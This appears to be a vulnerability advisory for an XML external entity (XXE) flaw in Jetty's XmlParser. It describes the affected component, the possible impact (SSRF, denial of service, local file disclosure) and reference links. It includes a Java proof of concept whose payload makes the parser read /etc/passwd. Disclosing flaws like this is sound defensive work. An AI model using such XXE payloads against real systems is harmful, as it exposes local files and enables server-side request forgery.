---
description: XRAY-523189, MEDIUM, Jetty XmlParser XXE 
title: Jetty XmlParser XXE
date_published: "2023-07-12"
last_updated: "2023-07-12"
xray_id: XRAY-523189
vul_id: 
cvss: 
severity: medium
discovered_by: Uriya Yavnieli
type: vulnerability

---

## Summary

Jetty XmlParser is vulnerable to XML external entity (XXE) vulnerability

## Component

org.eclipse.jetty:xml

## Affected versions

(,) Currently no fixed version

## Description

XmlParser is vulnerable to XML external entity (XXE) vulnerability.
XmlParser is being used when parsing Jetty’s xml configuration files. An attacker might exploit
this vulnerability in order to achieve SSRF or cause a denial of service.
One possible scenario is importing a (remote) malicious WAR into a Jetty’s server, while the
WAR includes a malicious web.xml.

This is not considered a vulnerability of the Jetty server itself, as any such usage of the Jetty XmlParser is equally vulnerable as a direct usage of the JVM supplied SAX parser.

However, any direct usage of the `XmlParser` class by an application may be vulnerable. The impact would greatly depend on how the application uses `XmlParser`, but it could be a denial of service due to large entity expansion, or possibly the revealing local files if the XML results are accessible remotely.

## PoC

```java
package com.example;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

import org.eclipse.jetty.xml.XmlParser;
import org.eclipse.jetty.xml.XmlParser.Node;
import org.xml.sax.SAXException;

public class App 
{
    public static void main( String[] args )
    {
        XmlParser xmlParser = new XmlParser(true);
        String xmlContent = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd/\" >]><foo>&xxe;</foo>";
        InputStream targetStream = new ByteArrayInputStream(xmlContent.getBytes());
        try {
            Node node = xmlParser.parse(targetStream);
            System.out.println(node.toString());
        } catch (IOException e) {
            e.printStackTrace();
        } catch (SAXException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }
}

```





## References

[https://github.com/eclipse/jetty.project/security/advisories/GHSA-58qw-p7qm-5rvh](https://github.com/eclipse/jetty.project/security/advisories/GHSA-58qw-p7qm-5rvh)

[https://github.com/eclipse/jetty.project/pull/10067](https://github.com/eclipse/jetty.project/pull/10067)

